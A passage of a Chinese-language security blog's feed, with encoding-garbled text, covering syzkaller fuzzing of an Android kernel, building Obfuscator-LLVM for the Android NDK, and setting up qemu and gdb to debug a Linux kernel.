&lt;p>é‡æ–°ç¼–è¯‘aospå¯åŠ¨é•œåƒ å†åˆ·å…¥æ‰‹æœºã€‚&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x03-å¼€å¯fuzzing">0x03 å¼€å¯fuzzing&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">./bin/syz-manager -config&lt;span class="o">=&lt;/span>android.cfg
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200916163028.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>fuzz&lt;/p>
&lt;p>æ‰‹æœºä¸æ–­é‡å¯ã€‚ã€‚ã€‚ã€‚&lt;/p>
&lt;p>æŸ¥çœ‹msg:&lt;code>adb shell dmesg -w&lt;/code>&lt;/p>
&lt;p>&lt;code>syz-manager -debug&lt;/code> æŸ¥çœ‹syzçš„ç›¸å…³é—®é¢˜ã€‚&lt;/p>
&lt;h3 id="å‚è€ƒ">å‚è€ƒ&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>[1]https://source.android.google.cn/setup/build?hl=zh-cn&lt;/p>
&lt;/li>
&lt;li>
&lt;p>[2]https://source.android.google.cn/setup/build/building-kernels?hl=zh-cn&lt;/p>
&lt;/li>
&lt;li>
&lt;p>[3]https://source.android.com/devices/tech/debug/kasan-kcov&lt;/p>
&lt;/li>
&lt;li>
&lt;p>[4]https://github.com/google/syzkaller/blob/master/docs/linux/setup_linux-host_android-device_arm-kernel.md&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>OLLVM_æ··æ·†ä¹‹ä¸€ï¼ˆè¡¥</title><link>https://ykiko.top/p/ollvm_%E6%B7%B7%E6%B7%86%E4%B9%8B%E4%B8%80%E8%A1%A5/</link><pubDate>Tue, 10 Sep 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/ollvm_%E6%B7%B7%E6%B7%86%E4%B9%8B%E4%B8%80%E8%A1%A5/</guid><description>&lt;h1 id="ollvm_æ··æ·†ä¹‹ä¸€è¡¥">OLLVM_æ··æ·†ä¹‹ä¸€ï¼ˆè¡¥&lt;/h1>
&lt;h3 id="ollvm">OLLVM&lt;/h3>
&lt;p>OLLVM(Obfuscator-LLVM)æ˜¯ç‘å£«è¥¿åŒ—åº”ç”¨ç§‘æŠ€å¤§å­¦å®‰å…¨å®éªŒå®¤äº2010å¹´6æœˆä»½å‘èµ·çš„ä¸€ä¸ªé’ˆå¯¹LLVMä»£ç æ··æ·†é¡¹ç›®ï¼Œ ç”¨äºå¢åŠ é€†å‘éš¾åº¦ï¼Œä¿æŠ¤ä»£ç çš„å®‰å…¨ã€‚æœ€æ–°ç‰ˆæœ¬ä¸º&lt;a class="link" href="https://github.com/obfuscator-llvm/obfuscator/tree/llvm-4.0" target="_blank" rel="noopener"
>4.0&lt;/a>ã€‚OLLVMé€‚ç”¨LLVMæ”¯æŒçš„æ‰€æœ‰è¯­è¨€ï¼ˆC, C++, Objective-C, Ada å’Œ Fortranï¼‰å’Œç›®æ ‡å¹³å°ï¼ˆx86, x86-64, PowerPC, PowerPC-64, ARM, Thumb, SPARC, Alpha, CellSPU, MIPS, MSP430, SystemZ, å’Œ XCoreï¼‰ã€‚&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="http://llvm.org/" target="_blank" rel="noopener"
>LLVM&lt;/a>æ˜¯lowlevel virtual machineçš„ç®€ç§°ï¼Œæ˜¯ä¸€ä¸ªç¼–è¯‘å™¨æ¡†æ¶ã€‚è¯¦ç»†ä»‹ç»å¯ä»¥çœ‹&lt;a class="link" href="https://zh.wikipedia.org/wiki/LLVM" target="_blank" rel="noopener"
>WIKI-LLVM&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180823112535.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>ç»å…¸çš„ä¸‰æ®µå¼è®¾è®¡ï¼Œå‰ç«¯ä½¿ç”¨ä¸åŒçš„ç¼–è¯‘å·¥å…·å¯¹ä»£ç è¿›è¡Œåˆ†æè½¬æ¢æˆLLVMçš„ä¸­é—´è¡¨ç¤ºIRï¼ˆintermediate representationï¼‰ã€‚ä¸­é—´éƒ¨åˆ†ä¼˜åŒ–å™¨åªå¯¹IRè¿›è¡Œæ“ä½œï¼Œé€šè¿‡ä¸€ç³»åˆ—çš„Passå¯¹IRåšä¼˜åŒ–ã€‚åç«¯ä¸»è¦æ˜¯è®²ä¼˜åŒ–å¥½çš„IRè§£é‡Šæˆå¯¹åº”çš„æœºå™¨ç ã€‚&lt;/p>
&lt;p>å¯¹IRçš„å¤„ç†è¿‡ç¨‹ä¸‹å›¾ï¼š&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180823113111.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>IR Pass&lt;/p>
&lt;p>OLLVMçš„æ··æ·†æ“ä½œåœ¨IRå±‚ï¼Œé€šè¿‡ç¼–å†™Passæ¥æ··æ·†IRï¼Œä»¥è‡´åç«¯ç”Ÿæˆçš„ç›®æ ‡ä»£ç ä¹Ÿè¢«æ··æ·†äº†ã€‚&lt;/p>
&lt;h3 id="ollvm-androidç¯å¢ƒæ­å»º">OLLVM-Androidç¯å¢ƒæ­å»º&lt;/h3>
&lt;p>å‰æç¯å¢ƒï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>NDKç¯å¢ƒ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LLVM&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>ä¸‹è½½æºç (åŒ…æ‹¬äº†LLVMå’ŒClang)-ç¼–è¯‘OLLVMæ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="n">$&lt;/span> &lt;span class="n">git&lt;/span> &lt;span class="n">clone&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">b&lt;/span> &lt;span class="n">llvm&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">4&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">0&lt;/span> &lt;span class="n">https&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="c1">//github.com/obfuscator-llvm/obfuscator.git
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">$&lt;/span> &lt;span class="n">mkdir&lt;/span> &lt;span class="n">build&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">$&lt;/span> &lt;span class="n">cd&lt;/span> &lt;span class="n">build&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">$&lt;/span> &lt;span class="n">cmake&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">DCMAKE_BUILD_TYPE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">Release&lt;/span> &lt;span class="o">../&lt;/span>&lt;span class="n">obfuscator&lt;/span>&lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//ï¼ˆcmake -G &amp;#34;MinGW Makefiles&amp;#34; -DCMAKE_BUILD_TYPE=Release ../obfuscator/ï¼‰(windows)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">$&lt;/span> &lt;span class="n">make&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">j7&lt;/span> &lt;span class="c1">//è¿™ä¸ªæ•°å­—è‡ªå·±çœ‹è‡ªå·±CPUå¡« å¤ªå°å¯èƒ½éå¸¸ç¼–è¯‘æ…¢
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¯ä»¥å‚ç…§&lt;a class="link" href="https://github.com/obfuscator-llvm/obfuscator/wiki" target="_blank" rel="noopener"
>å®˜æ–¹wiki&lt;/a>æ¥æ“ä½œã€‚ç¼–è¯‘å®Œæˆåï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶æ”¾åœ¨build/binç›®å½•ä¸‹ã€‚&lt;/p>
&lt;p>é…ç½®æ•´åˆNDKï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>æ‰“å¼€NDKç›®å½•ndk-bundleä¸‹çš„toolchainsï¼Œæ–°å»ºobfuscator-llvm-4ï¼Œå°†llvmæ–‡ä»¶å¤¹é‡Œçš„æ‰€æœ‰æ–‡ä»¶å¤åˆ¶åˆ°æ–°å»ºçš„ç›®å½•ä¸‹ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å°†&lt;code>\build\bin&lt;/code>ç›®å½•ä¸‹çš„&lt;code>clang.exe&lt;/code>ã€&lt;code>clang++.exe&lt;/code>å’Œ&lt;code>clang-format.exe&lt;/code>å¤åˆ¶åˆ°&lt;code>\toolchains\llvm\prebuilt\windows-x86_64\bin&lt;/code>ç›®å½•ä¸‹ï¼Œç›´æ¥æ›¿æ¢æ‰å…¶ä¸­çš„æ–‡ä»¶ã€‚ï¼ˆWindowsä¸‹ï¼‰&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ï¼ˆlinuxä¸‹)å°†llvmç›®å½•ä¸‹çš„prebuiltç›®å½•å’Œæ–‡ä»¶ config.mkã€setup.mkå’Œsetup-common.mkæ‹·è´åˆ°åˆ›å»ºçš„obfuscator-llvmç›®å½•ä¸‹-&amp;gt;ç„¶åæ›¿æ¢obfuscator-llvm/prebuilt/linux-x86ä¸‹çš„binå’Œlibä¸ºæˆ‘ä»¬ç¼–è¯‘å¥½çš„binå’Œlib&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç„¶åå°†ä¸‹é¢æ–‡ä»¶å¤åˆ¶ä¸€ä»½ï¼Œæ”¹åç§°å¦‚ä¸‹ï¼Œæ¯”å¦‚arm-linux-androideabi-clang3.4å¤åˆ¶ä¸€è¡Œæ”¹åä¸ºarm-linux-androideabi-obfuscator3.4&lt;/p>
&lt;p>arm-linux-androideabi-clang3.4-&amp;gt; arm-linux-androideabi-obfuscator3.4&lt;/p>
&lt;p>mipsel-linux-android-clang3.4-&amp;gt; mipsel-linux-android-obfuscator3.4&lt;/p>
&lt;p>x86-clang3.4-&amp;gt; x86-obfuscator3.4&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åˆ†åˆ«ä¿®æ”¹ä»¥ä¸Šä¸‰ä¸ªæ–‡ä»¶çš„ setup.mk ä¸­çš„ LLVM_NAME ï¼Œå³å°†å…¶æŒ‡å®šåˆ°å¼€å§‹å»ºç«‹çš„obfuscator-llvm-3.4ç›®å½•ï¼Œä¹Ÿå°±æ˜¯æŠŠæŠŠ&lt;code>LLVM_NAME := llvm-$(LLVM_VERSION)æ”¹æˆLLVM_NAME := obfuscator-llvm-$(LLVM_VERSION)&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¦‚æœæ˜¯é…ç½®64ä½çš„ndké…ç½®,è¿˜è¦é¢å¤–ä¿®æ”¹$NDK_PATH/build/core/setup-toolchain.mkæ–‡ä»¶ï¼Œåœ¨NDK_64BIT_TOOLCHAIN_LIST := åŠ å…¥ obfuscator å¯¹åº”çš„NDK_TOOLCHAIN_VERSION NDK_64BIT_TOOLCHAIN_LIST := obfuscator3.4 clang3.6 clang3.5 clang3.4 4.9â€™&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="å¼€å§‹ä½¿ç”¨ollvm">å¼€å§‹ä½¿ç”¨OLLVM&lt;/h3>
&lt;h3 id="å‚è€ƒ">å‚è€ƒ&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="http://www.freebuf.com/articles/terminal/130142.html" target="_blank" rel="noopener"
>http://www.freebuf.com/articles/terminal/130142.html&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/" target="_blank" rel="noopener"
>https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.jmpoep.com/thread-4016-1-1.html" target="_blank" rel="noopener"
>https://www.jmpoep.com/thread-4016-1-1.html&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>BCTFhttp://ele7enxxh.com/Bctf-2016-LostFlower-Writeup.html&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>qemu+gdbè°ƒè¯•Linuxå†…æ ¸</title><link>https://ykiko.top/p/qemu-gdb%E8%B0%83%E8%AF%95linux%E5%86%85%E6%A0%B8/</link><pubDate>Wed, 28 Aug 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/qemu-gdb%E8%B0%83%E8%AF%95linux%E5%86%85%E6%A0%B8/</guid><description>&lt;h1 id="qemugdbè°ƒè¯•linuxå†…æ ¸">qemu+gdbè°ƒè¯•Linuxå†…æ ¸&lt;/h1>
&lt;h3 id="å‰è¨€">å‰è¨€&lt;/h3>
&lt;p>è°ƒè¯•Linuxå†…æ ¸å¯ä»¥ä½¿ç”¨VMåŒæœºè°ƒè¯•ï¼Œä¸è¿‡ä½¿ç”¨qemuæ¥è°ƒè¯•ä¼šæ›´åŠ æ–¹ä¾¿ã€‚&lt;/p>
&lt;h3 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º&lt;/h3>
&lt;h3 id="ç¼–è¯‘æºç ">ç¼–è¯‘æºç &lt;/h3>
&lt;p>é¦–å…ˆåˆ°Linux &lt;a class="link" href="https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/" target="_blank" rel="noopener"
>FTPä»“åº“&lt;/a>æˆ–è€…&lt;a class="link" href="https://www.kernel.org/" target="_blank" rel="noopener"
>å®˜ç½‘&lt;/a>ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„æºç ã€‚&lt;/p>
&lt;p>è¿™é‡Œä¸‹è½½çš„æ˜¯&lt;code>linux-4.10.10&lt;/code>&lt;/p>
&lt;p>è§£å‹&lt;code>tar -xvJf linux-4.10.10.tar.xz&lt;/code>&lt;/p>
&lt;p>å®‰è£…ä¾èµ–&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo apt install build-essential ncurses-dev xz-utils libssl-dev bc fakeroot aptitude libncurses5-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo apt install qemu
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="ç¼–è¯‘å†…æ ¸">ç¼–è¯‘å†…æ ¸&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl"> make menuconfig
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md.oss-cn-shenzhen.aliyuncs.com/20190828152106.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>è¿›è¡Œé…ç½®ï¼š&lt;code>KernelHacking&lt;/code> â€”&amp;gt; &lt;code>Compile-time checks and compiler options&lt;/code>é€‰ä¸­&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">Compile the kernel with debug info
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">Compile the kernel with frame pointers
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">Provide GDB scripts for kernel debugging
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">Processor type and featuresâ†’å»æ‰Paravirtualized guest support
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¿å­˜é€€å‡ºã€‚&lt;/p>
&lt;p>å‘½ä»¤&lt;code>make -jN&lt;/code> è¿›è¡Œç¼–è¯‘&lt;/p>
&lt;p>ä¹‹å&lt;code>make all&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">make modules
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç¼–è¯‘å®Œæˆä¹‹åï¼Œ&lt;code>vmlinux&lt;/code>åœ¨æºç æ ¹ç›®å½•ã€&lt;code>bzImage&lt;/code>åœ¨&lt;code>./arch/x86/boot/&lt;/code>ä¸‹&lt;/p>
&lt;h3 id="æ„å»ºinitramfsæ ¹æ–‡ä»¶ç³»ç»Ÿ">æ„å»ºinitramfsæ ¹æ–‡ä»¶ç³»ç»Ÿ&lt;/h3>
&lt;p>å€ŸåŠ©BusyBoxæ„å»ºæç®€initramfsï¼Œbusyboxæœ€æ–°ç‰ˆ&lt;a class="link" href="https://busybox.net/downloads/" target="_blank" rel="noopener"
>ä¸‹è½½åœ°å€&lt;/a>&lt;/p>
&lt;p>ç¼–è¯‘é™æ€ç‰ˆBusybox&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">make menuconfig
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md.oss-cn-shenzhen.aliyuncs.com/20190828160608.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>è®¾ç½®ä»¥ä¸‹é€‰é¡¹ï¼š&lt;/p>
&lt;p>Settings -&amp;gt; Build Options -&amp;gt; Build static binary (no shared libs) ç¼–è¯‘æˆé™æ€æ–‡ä»¶&lt;/p>
&lt;p>å¼€å§‹ç¼–è¯‘ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">make -jNmake install
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç­‰å¾…ç¼–è¯‘å®Œæˆæºç ç›®å½•ä¸‹å‡ºç°&lt;code>_install&lt;/code>ç›®å½•ï¼Œè¿›è¡Œé…ç½®ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> _install
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mkdir proc sys dev etc etc/init.d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> vim etc/init.d/rcS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\#&lt;/span> æ–‡ä»¶ä¸­çš„å†…å®¹å¦‚ä¸‹
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\#&lt;/span> &lt;span class="c1">#!/bin/sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\#&lt;/span> mount -t proc none /proc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\#&lt;/span> mount -t sysfs none /sys
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\#&lt;/span> /sbin/mdev -s
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> chmod +x etc/init.d/rcS
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find . &lt;span class="p">|&lt;/span> cpio -o --format&lt;span class="o">=&lt;/span>newc &amp;gt; ../rootfs.img
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="è¿è¡Œå†…æ ¸">è¿è¡Œå†…æ ¸&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">qemu-system-x86_64 &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -kernel ~/linux-4.10.10/arch/x86_64/boot/bzImage &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -initrd ~/busybox-1.31.0/rootfs.img &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -append &lt;span class="s2">&amp;#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init&amp;#34;&lt;/span> &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -cpu kvm64,+smep,+smap &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -nographic &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -gdb tcp::1234
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>
&lt;p>&lt;code>cpu kvm64,+smep,+smap&lt;/code> è®¾ç½®CPUçš„å®‰å…¨é€‰é¡¹ï¼Œè¿™é‡Œå¼€å¯äº†smapå’Œsmep&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>kernel&lt;/code> è®¾ç½®å†…æ ¸bzImageæ–‡ä»¶çš„è·¯å¾„&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>initrd&lt;/code> è®¾ç½®åˆšæ‰åˆ©ç”¨busyboxåˆ›å»ºçš„rootfs.imgï¼Œä½œä¸ºå†…æ ¸å¯åŠ¨çš„æ–‡ä»¶ç³»ç»Ÿ&lt;/p>
&lt;/li>
&lt;li>
